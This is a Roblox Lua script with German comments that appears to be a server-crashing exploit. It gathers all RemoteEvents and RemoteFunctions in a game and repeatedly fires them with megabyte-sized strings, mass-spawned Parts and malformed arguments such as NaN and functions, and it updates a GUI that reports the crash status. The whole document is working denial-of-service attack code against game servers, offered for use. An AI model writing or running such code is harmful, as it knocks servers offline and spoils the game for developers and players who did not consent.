-- 1. ALLE RemoteEvents finden
local function findAllRemoteEvents()
    local events = {}
    local allObjects = game:GetDescendants()
    for i = 1, #allObjects do
        local obj = allObjects[i]
        if obj.ClassName == "RemoteEvent" or obj.ClassName == "RemoteFunction" then
            table.insert(events, obj)
        end
    end
    return events
end

-- 2. Große Datenpakete erzeugen
local function createBigPayload()
    local payload = {
        string.rep("X", 500000),
        string.rep("UTF-8-Text-™®©", 10000),
        {
            [string.rep("a", 1000)] = string.rep("b", 1000),
            [string.rep("c", 1000)] = string.rep("d", 1000)
        }
    }
    return payload
end

-- 3. Massenhaft Parts erstellen
local function createManyParts()
    local parts = {}
    for i = 1, 150 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(10, 10, 10)
        part.Position = Vector3.new(
            math.random(-100, 100),
            math.random(-100, 100),
            math.random(-100, 100)
        )
        table.insert(parts, part)
        totalParts = totalParts + 1
    end
    return parts
end

-- CRASH LOOP
local function crashLoop()
    local bigString = string.rep("Z", 1000000)
    local bigPayload = createBigPayload()
    
    print("[*] Crash gestartet!")
    print("[*] Gefundene Events: " .. #allEvents)
    
    while isRunning do
        for _, remote in ipairs(allEvents) do
            if not isRunning then break end
            
            -- METHODE 1: Große Daten
            pcall(function()
                remote:FireServer(bigPayload, bigString, createManyParts())
            end)

            -- METHODE 2: Massen-Spawns
            pcall(function()
                for i = 1, 50 do
                    if not isRunning then break end
                    remote:FireServer(createManyParts())
                end
            end)

            -- METHODE 3: Falsche Datentypen
            pcall(function()
                remote:FireServer(nil, {}, function() end, 0/0)
            end)
        end
        
        -- GUI Update
        eventCount = #allEvents
        InfoLabel.Text = "Events: " .. eventCount .. " | Parts: " .. totalParts
        
        task.wait(0.01)
    end
    
    print("[*] Crash gestoppt!")
    StatusLabel.Text = "Status: STOPPED"
    StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
end

